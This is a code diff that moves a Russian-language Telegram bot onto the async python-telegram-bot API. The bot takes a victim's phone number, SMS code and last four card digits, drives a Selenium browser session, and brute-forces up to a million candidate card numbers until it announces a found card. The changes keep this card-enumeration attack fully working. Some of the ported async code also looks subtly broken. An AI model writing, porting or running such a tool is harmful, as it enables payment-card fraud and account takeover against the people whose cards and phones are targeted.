@@ -9,8 +9,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
 from telegram import Update, Bot
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from telegram.ext import ConversationHandler
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
 # Enable logging
 logging.basicConfig(
@@ -152,7 +151,7 @@ def try_card_number(session: UserSession, card_number: str) -> bool:
         logger.error(f"Error trying card number {card_number}: {e}")
         return False
 
-def brute_force_worker(session: UserSession, bot: Bot):
+async def brute_force_worker(session: UserSession, app: Application):
     """Worker thread for brute-forcing card numbers"""
     try:
         for candidate in range(session.current_candidate, 1000000):
@@ -172,7 +171,7 @@ def brute_force_worker(session: UserSession, bot: Bot):
                     session.stop_brute_force = True
                     
                     # Send success message
-                    bot.send_message(
+                    await app.bot.send_message(
                         chat_id=session.user_id,
                         text=f"✅ Успех! Найдена карта: {full_card}"
                     )
@@ -185,7 +184,7 @@ def brute_force_worker(session: UserSession, bot: Bot):
             # Update progress every 1000 candidates
             if candidate % 1000 == 0:
                 progress = (candidate / 1000000) * 100
-                bot.send_message(
+                await app.bot.send_message(
                     chat_id=session.user_id,
                     text=f"⏳ Прогресс: {progress:.1f}% (проверено {candidate} комбинаций)"
                 )
@@ -195,14 +194,14 @@ def brute_force_worker(session: UserSession, bot: Bot):
             session.current_candidate = candidate + 1
         
         # If loop completes without finding
-        bot.send_message(
+        await app.bot.send_message(
             chat_id=session.user_id,
             text="❌ Не удалось найти подходящую карту. Попробуйте с другими данными."
         )
         
     except Exception as e:
         logger.error(f"Error in brute force worker: {e}")
-        bot.send_message(
+        await app.bot.send_message(
             chat_id=session.user_id,
             text=f"❌ Ошибка в процессе подбора: {str(e)}"
         )
@@ -214,7 +213,7 @@ def brute_force_worker(session: UserSession, bot: Bot):
             del user_sessions[session.user_id]
 
 # Telegram bot handlers
-def start(update: Update, context: CallbackContext) -> int:
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start the conversation and ask for phone number"""
     user_id = update.effective_user.id
     
@@ -230,7 +229,7 @@ def start(update: Update, context: CallbackContext) -> int:
     )
     return State.WAITING_PHONE.value
 
-def receive_phone(update: Update, context: CallbackContext) -> int:
+async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Receive phone number and start browser session"""
     user_id = update.effective_user.id
     if user_id not in user_sessions:
@@ -265,7 +264,7 @@ def receive_phone(update: Update, context: CallbackContext) -> int:
         update.message.reply_text(f"❌ Ошибка: {str(e)}")
         return ConversationHandler.END
 
-def receive_sms(update: Update, context: CallbackContext) -> int:
+async def receive_sms(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Receive SMS code and proceed to card entry"""
     user_id = update.effective_user.id
     if user_id not in user_sessions:
@@ -296,7 +295,7 @@ def receive_sms(update: Update, context: CallbackContext) -> int:
         update.message.reply_text(f"❌ Ошибка: {str(e)}")
         return ConversationHandler.END
 
-def receive_last4(update: Update, context: CallbackContext) -> int:
+async def receive_last4(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Receive last 4 digits and start brute force"""
     user_id = update.effective_user.id
     if user_id not in user_sessions:
@@ -319,16 +318,17 @@ def receive_last4(update: Update, context: CallbackContext) -> int:
     )
     
     # Start brute force in separate thread
+    import asyncio
+    loop = asyncio.get_event_loop()
     session.brute_force_thread = threading.Thread(
-        target=brute_force_worker,
-        args=(session, context.bot)
+        target=lambda: loop.run_until_complete(brute_force_worker(session, context.application))
     )
     session.brute_force_thread.start()
     
     session.state = State.BRUTE_FORCE
     return State.BRUTE_FORCE.value
 
-def cancel(update: Update, context: CallbackContext) -> int:
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the current operation"""
     user_id = update.effective_user.id
     if user_id in user_sessions:
@@ -343,44 +343,43 @@ def cancel(update: Update, context: CallbackContext) -> int:
     update.message.reply_text("❌ Операция отменена.")
     return ConversationHandler.END
 
-def error_handler(update: Update, context: CallbackContext):
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle errors"""
     logger.error(f"Update {update} caused error {context.error}")
     if update and update.effective_message:
-        update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")
+        await update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")
 
-def main():
+async def main():
     """Start the bot"""
-    updater = Updater(TOKEN)
-    dispatcher = updater.dispatcher
+    app = Application.builder().token(TOKEN).build()
     
     # Create conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
             State.WAITING_PHONE.value: [
-                MessageHandler(Filters.text & ~Filters.command, receive_phone)
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)
             ],
             State.WAITING_SMS.value: [
-                MessageHandler(Filters.text & ~Filters.command, receive_sms)
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sms)
             ],
             State.WAITING_LAST4.value: [
-                MessageHandler(Filters.text & ~Filters.command, receive_last4)
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_last4)
             ],
             State.BRUTE_FORCE.value: [
-                MessageHandler(Filters.text & ~Filters.command, 
+                MessageHandler(filters.TEXT & ~filters.COMMAND, 
                              lambda update, context: update.message.reply_text("⏳ Идет подбор карты..."))
             ],
         },
         fallbacks=[CommandHandler('cancel', cancel)],
     )
     
-    dispatcher.add_handler(conv_handler)
-    dispatcher.add_error_handler(error_handler)
+    app.add_handler(conv_handler)
+    app.add_error_handler(error_handler)
     
     # Start the Bot
-    updater.start_polling()
-    updater.idle()
+    await app.run_polling()
 
 if __name__ == '__main__':
-    main()
+    import asyncio
+    asyncio.run(main())
